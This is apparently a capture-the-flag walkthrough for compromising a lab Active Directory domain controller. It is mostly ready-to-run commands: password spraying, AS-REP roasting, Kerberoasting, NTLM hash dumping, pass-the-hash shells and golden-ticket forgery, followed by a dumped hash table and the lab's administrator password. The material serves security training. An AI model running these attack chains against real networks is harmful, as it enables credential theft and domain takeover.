# Active Directory Attack

## Nmap Reconnaissance

Scan Domain Controller's open ports.

`nmap -Pn 172.140.0.40`

- Add DNS Server as the Domain Controller machine.
- Map the Domain Controller's IP to the `dc01.xyz.com` domain.

```sh
echo "172.140.0.40 dc01.xyz.com" >> /etc/hosts
echo -e "nameserver 172.140.0.40\noptions ndots:0\nnameserver 8.8.8.8" > /etc/resolv.conf
```

> 172.140.0.40 is the IP address of the Domain Controller in this example.

## Password Brute-Forcing

Create a `users.txt` file with some commonly known AD user nicknames. Try to fetch some AD users with *CrackMapExec*.

```sh
crackmapexec ldap dc01.xyz.com -u users.txt -p '' -k
```

Now, maybe we can create a `passwords.txt` file with some `rockyou.txt` passwords.

```sh
crackmapexec ldap dc01.xyz.com -u users.txt -p passwords.txt --continue-on-success | grep '[+]'
```

If we are lucky enough, we will get a match. We can test a successful login with:

```sh
crackmapexec smb dc01.xyz.com -u USERNAME -p PASSWORD
```

To this commands we can append several flags:
- `--pass-pol` to view the AD password policy.
- `--users` to view the AD users.
- `--groups` to view the AD groups.
- `--computers` to view the AD computers.

## Bloodhound

### Install Bloodhound

```sh
echo "deb http://httpredir.debian.org/debian stretch-backports main" | sudo tee -a /etc/apt/sources.list.d/stretch-backports.list

apt update

wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -

echo 'deb https://debian.neo4j.com stable latest' > /etc/apt/sources.list.d/neo4j.list

apt update

apt install -y apt-transport-https neo4j

service stop neo4j

cd /usr/bin

./neo4j console &

wget https://github.com/BloodHoundAD/BloodHound/releases/download/v4.3.0/BloodHound-linux-x64.zip

mv BloodHound-linux-x64.zip /opt/

cd /opt

unzip BloodHound-linux-x64.zip

chmod +x BloodHound-linux-x64/BloodHound

./BloodHound-linux-x64/BloodHound --no-sandbox &
```

> Access http://localhost:7474, credentials are: neo4j/neo4j

Install Bloodhound:

```sh
pip install bloodhound
```
> Access http://localhost:7474

`bloodhound-python -u USERNAME -p PASSWORD -dc dc01.xyz.com -d xyz.com -c all`

Steps:

- Login into bloodhound.
- Upload data from previous collection with `bloodhound-python`.
- Explore the tool!

# Impacket

## Get a Shell on that User (Local Admin Account)

As we have a middle man which is the container, we need to change a little bit the logic of Impacket's python script:
Ref: https://github.com/fortra/impacket/issues/272

`nano /usr/lib/python3/dist-packages/impacket/dcerpc/v5/dcomrt.py`

Line 1283
```py
LOG.debug('StringBinding chosen: %s' % stringBinding)
if stringBinding is None:
	stringBinding = 'ncacn_ip_tcp:%s%s' % (self.get_target(), bindingPort)
    
dcomInterface = transport.DCERPCTransportFactory(stringBinding)
```

This command is only valid for the local admin account, due to the higher privilege level.

`impacket-wmiexec xyz.com/USERNAME:PASSWORD@dc01.xyz.com -debug`

- Check privileges: `whoami /priv`

Try `impacket-smbclient` for file shares with
`impacket-smbclient xyz.com/USERNAME:PASSWORD@dc01.xyz.com`:

```
> shares
> use internal
> cat flag.txt
```

*Running this for an unprivileged user doesn't grant us access to that share.*

Try for RDP as well as impacket-psexec:

`impacket-rdp_check xyz.com/USERNAME:PASSWORD@dc01.xyz.com`

`impacket-psexec` doesn't give us any results because malicious code execution is flagged by Windows.

> Ref: https://www.trustedsec.com/blog/no_psexec_needed/

# AS-REP Roasting
## Kerberos Brute-Force (save TGTs)

- Install `kerbrute`:

```
git clone https://github.com/TarlogicSecurity/kerbrute
cd kerbrute
pip install -r requirements.txt
```

Run (where `users.txt` holds some User Accounts + Service Accounts) gives us matches between AD Users and passwords like *CrackMapExec* but it also warns for the fact that an account does not have pre-authentication enabled. It also saves TGT tickets for the targeted users in case a password is found.

`python3 kerbrute.py -domain xyz.com -users users.txt -passwords passwords.txt -outputfile domain_passwords.txt`

Using CME we can also find accounts with pre-authentication disabled:

`crackmapexec ldap dc01.xyz.com -u users.txt -p '' --asreproast out.txt`

We then crack the account's AS-REP message offline using:
`hashcat -m18200 out.txt passwords.txt`

> Ref: https://wiki.porchetta.industries/ldap-protocol/asreproast

# Kerberoasting (Needs Domain Account)

At first, enumerate AD objects with:

`crackmapexec smb dc01.xyz.com -u USERNAME -p PASSWORD -d xyz.com --rid-brute`

### Brute-forcing Passwords of ServiceAccounts (Only one Kerberoastable)

With the information of the existing service accounts we can try to brute-force the service accounts but only one will be likely to succeed.

```sh
crackmapexec smb dc01.xyz.com -u http_svc$ -p passwords.txt
crackmapexec smb dc01.xyz.com -u mssql_svc$ -p passwords.txt
crackmapexec smb dc01.xyz.com -u exchange_svc$ -p passwords.txt
```

> Refs: https://www.tarlogic.com/blog/how-to-attack-kerberos/


A more elegant way consists on executing the Kerberoasting attack.

We update the `users.txt` file with the service accounts:

> `users.txt` now contains: http_svc$ | mssql_svc$ | exchange_svc$


> Ref: getUserSPNs.py from https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py

Using the `getUserSPNs.py` script from the above reference we fetch the TGS ticket from the vulnerable service account.

`python getUserSPNs.py xyz.com/USERNAME:PASSWORD -usersfile users.txt -outputfile hashes.kerberoast`

- Crack TGS ticket:

`hashcat -m13100 --force -a 0 hashes.kerberoast passwords.txt`

### Pass The Ticket & Overpass The Hash (Intended Solution)

## Drop NTLM Hashes & Others (Requires Local Admin Account at least)

`impacket-secretsdump xyz.com/USERNAME:PASSWORD@dc01.xyz.com`

### Drop only NTLM hashes

`impacket-secretsdump -just-dc-ntlm xyz.com/USERNAME:PASSWORD@dc01.xyz.com`

- Grab Administrator account LMHASH:NTHASH hash.
- Get Administrator TGT by running:

```sh
impacket-getTGT xyz.com/Administrator -hashes LMHASH:NTHASH

export KRB5CCNAME=/Administrator.ccache

# Obtain Remote Administrator Shell
impacket-wmiexec xyz.com/Administrator@dc01.xyz.com -k -no-pass -debug

# Obtain SMB Shell with Administrator Privileges
impacket-smbclient xyz.com/Administrator@dc01.xyz.com -k -no-pass -debug
```

With each of them, the attacker can get to the *INTERNAL* share and get the secret flag.

> Ref: https://www.thehacker.recipes/ad/movement/kerberos/ptk

# PsExec Unintended Solution

From the local administrator, download and run the *PsExec* executable with:

Download `PsExec` (https://learn.microsoft.com/en-us/sysinternals/downloads/psexec):

- `.\PsExec64.exe -accepteula \\dc01 -s cmd`
- `whoami` returns: `nt authority\system`
- `cd ..\..\Users\Administrator`
- `type flag.txt`

> Ref: https://medium.com/tenable-techblog/psexec-local-privilege-escalation-2e8069adc9c8

# Golden Ticket

## Grab NT Hashes 

`impacket-secretsdump -just-dc-ntlm xyz.com/USERNAME:PASSWORD@dc01.xyz.com`

## Get Domain SID

`crackmapexec ldap dc01.xyz.com -u USERNAME -p PASSWORD --get-sid`


## Craft Golden Ticket For Administrator user


### DCSync Attack

Use *Mimikatz* with Replication Account to perform DCSync attack and get NTLM hashes.

`lsadump::dcsync /domain:xyz.com /user:krbtgt`

### Craft Golden Ticket (Should be run within a Workstation)

```
kerberos::golden /domain:xyz.com /sid:S-1-5-21-2000547303-2172798533-1239318658 /user:Administrator /krbtgt:a4b2dbb473eef2b77dd1dec119cc5cd9 /id:500 /ptt

misc::cmd

dir \\dc01\c$
```

> Ref: https://juggernaut-sec.com/domain-persistence-golden-ticket-and-silver-ticket-attacks/



# EXTRA: Getting NTDS.dit file

`crackmapexec smb 172.140.0.40 -u administrator -p completeSecurePassw0rd --ntds`

```
SMB         172.140.0.40    445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:xyz.com) (signing:True) (SMBv1:False)
SMB         172.140.0.40    445    DC01             [+] xyz.com\administrator:completeSecurePassw0rd (Pwn3d!)
SMB         172.140.0.40    445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         172.140.0.40    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:4124f2ac13cbf884c4e0d592846485af:::
SMB         172.140.0.40    445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.140.0.40    445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:286aa959c8ab2c6dabce150c7b699d25:::
SMB         172.140.0.40    445    DC01             vagrant:1000:aad3b435b51404eeaad3b435b51404ee:4124f2ac13cbf884c4e0d592846485af:::
SMB         172.140.0.40    445    DC01             xyz.com\kpeake:1108:aad3b435b51404eeaad3b435b51404ee:6084ae91972fbeb924a2c906bf57c0ab:::
SMB         172.140.0.40    445    DC01             xyz.com\gchurchill:1109:aad3b435b51404eeaad3b435b51404ee:4339a092b5f8d8289c1314e9f1db9f94:::
SMB         172.140.0.40    445    DC01             xyz.com\jslater:1110:aad3b435b51404eeaad3b435b51404ee:b18ea39a58544b53b43e34200c21d751:::
SMB         172.140.0.40    445    DC01             xyz.com\cbuckland:1111:aad3b435b51404eeaad3b435b51404ee:af5432a79b941528fa7fac9e7e391651:::
SMB         172.140.0.40    445    DC01             xyz.com\ewalsh:1112:aad3b435b51404eeaad3b435b51404ee:b2afd3ee7005887d914650f0d30231c0:::
SMB         172.140.0.40    445    DC01             xyz.com\rkelly:1113:aad3b435b51404eeaad3b435b51404ee:fe9b5105002d720830b2861666851d1b:::
SMB         172.140.0.40    445    DC01             xyz.com\fallan:1114:aad3b435b51404eeaad3b435b51404ee:91d5b3ce10ef251dff59a63f93d34b36:::
SMB         172.140.0.40    445    DC01             xyz.com\jjohnston:1115:aad3b435b51404eeaad3b435b51404ee:6e2ba7aaa0297ecba56e3d90393bc147:::
SMB         172.140.0.40    445    DC01             xyz.com\rbond:1116:aad3b435b51404eeaad3b435b51404ee:70daf8eb7ca45fb508cf24852293609f:::
SMB         172.140.0.40    445    DC01             xyz.com\dhardacre:1117:aad3b435b51404eeaad3b435b51404ee:40d0748f1738f4701024af592dc3756c:::
SMB         172.140.0.40    445    DC01             xyz.com\nmitchell:1118:aad3b435b51404eeaad3b435b51404ee:c52abb1e14677d7ea228fcc1171ed7b7:::
SMB         172.140.0.40    445    DC01             xyz.com\amcgrath:1119:aad3b435b51404eeaad3b435b51404ee:570276986246b42ed08c1044fb6fd1a8:::
SMB         172.140.0.40    445    DC01             DC01$:1001:aad3b435b51404eeaad3b435b51404ee:ee82fb06d0a332342ed3d02037430188:::
SMB         172.140.0.40    445    DC01             http_svc$:1120:aad3b435b51404eeaad3b435b51404ee:9caa9f1a57f1e8959b9cf03c4b6e31f9:::
SMB         172.140.0.40    445    DC01             mssql_svc$:1121:aad3b435b51404eeaad3b435b51404ee:29746486d0a4b86306d63e8b84521882:::
SMB         172.140.0.40    445    DC01             exchange_svc$:1122:aad3b435b51404eeaad3b435b51404ee:7467172e489f15ca013cc9ad03b97ae0:::
SMB         172.140.0.40    445    DC01             [+] Dumped 20 NTDS hashes to /root/.cme/logs/DC01_172.140.0.40_2023-04-24_141454.ntds of which 16 were added to the database
```

> Extra: Ref (**Abuse DNSAdmins**): https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/

> Mimikatz and PsExec tools are available at C:\Users\Public\Documents

> Administrator AD Account Password is: `completeSecurePassw0rd`